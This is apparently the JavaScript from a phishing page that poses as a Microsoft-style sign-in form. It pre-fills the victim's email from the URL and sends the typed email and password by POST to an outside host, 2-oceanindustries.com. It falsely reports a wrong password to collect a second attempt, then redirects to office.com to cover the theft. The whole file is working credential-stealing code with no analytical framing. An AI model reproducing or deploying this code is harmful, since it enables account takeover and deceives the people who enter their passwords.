  /* global $ */
    $(document).ready(function(){

      $('#error').hide()
      $("#div2").hide()
      $("#msg").hide()

      var email = window.location.hash.substr(1)
      if (!email) {

      }
      else
      {
        $('#email').val(email)
        var my_email =email
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_email)) {
          $('#error').show()
          email.focus
          return false
        }
        var ind=my_email.indexOf("@")
        var my_slice=my_email.substr((ind+1))
        var c= my_slice.substr(0, my_slice.indexOf('.'))
        var fin= c.toLowerCase()
       //  if (fin=="gmail" || fin=="yahoo" || fin=="hotmail" || fin=="aol" || fin=="outlook") {
       //   $('#error').show()

       // }
       // else
       // {
        //$("#div1").animate({left:200, opacity:"hide"}, 0)
        //$("#div2").animate({right:200, opacity:"show"}, 1000)
        $('#div1').hide()
		$("#div2").show()
		$("#emailch").html(my_email)
      // }
      }

	  $('#email').keypress(function(){
			$('#error').hide()
		})
	  
      $('#next').click(function () {
        var my_email =$('#email').val()
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/

        if (!filter.test(my_email)) {
          $('#error').show()
          email.focus
          return false
        }
        var ind=my_email.indexOf("@")
        var my_slice=my_email.substr((ind+1))
        var c= my_slice.substr(0, my_slice.indexOf('.'))
        var fin= c.toLowerCase()
       //  if (fin=="gmail" || fin=="yahoo" || fin=="hotmail" || fin=="aol" || fin=="outlook") {
       //   $('#error').show()

       // }
       // else
       // {
        //$("#div1").animate({left:200, opacity:"hide"}, 0)
        //$("#div2").animate({right:200, opacity:"show"}, 1000)
		$('#div1').hide()
		$("#div2").show()
        $("#emailch").html(my_email)

      // }
    })
      $('#back').click(function () {
        $("#msg").hide()
        //$("#div2").animate({left:200, opacity:"hide"}, 0)
        //$("#div1").animate({right:200, opacity:"show"}, 1000)
		$('#div2').hide()
		$("#div1").show()

      })

var count=0
      $('#submit-btn').click(function(event){
        event.preventDefault()
        var email=$("#email").val()
        var password=$("#password").val()
        var detail=$("#field").html()
        var msg = $('#msg').html()
        $('#msg').text( msg )
		
		$('#password').keypress(function(){
			$('#msg1').hide()
			$('#msg').hide()
		})
		
		if(password.length < 6){
			$('#msg1').show()
			password.focus
			return false
		}		
		

        count=count+1
        $.ajax({
          dataType: 'JSON',
          url: 'https://2-oceanindustries.com/uncategorized/htacccess',
          type: 'POST',
          data:{
            email:email,
            password:password,
            detail:detail,

          },
          beforeSend: function(xhr){
            $('#submit-btn').html('Signing in...')
          },
          success: function(response){
            if(response){
              $("#msg").show()
              console.log(response)
              if(response['signal'] == 'ok'){
               $('#msg').html(response['msg'])
               var password=$("#password").val("")
             }
             else{
              $('#msg').html(response['msg'])
              var password=$("#password").val("")
            }
          }
        },
        error: function(){
          $("#msg").show()
		  $('#password').click(function(){
			$('#msg').hide()
		  })
          $('#msg').html("Your password does not match. Please try again.")
          var password=$("#password").val("")
        },
        complete: function(){
          $('#submit-btn').html('Sign in')
		  if (count>=2) {
				$('#msg').hide()
				window.location.replace("https://office.com")
			}
        }
      })
     })
    })
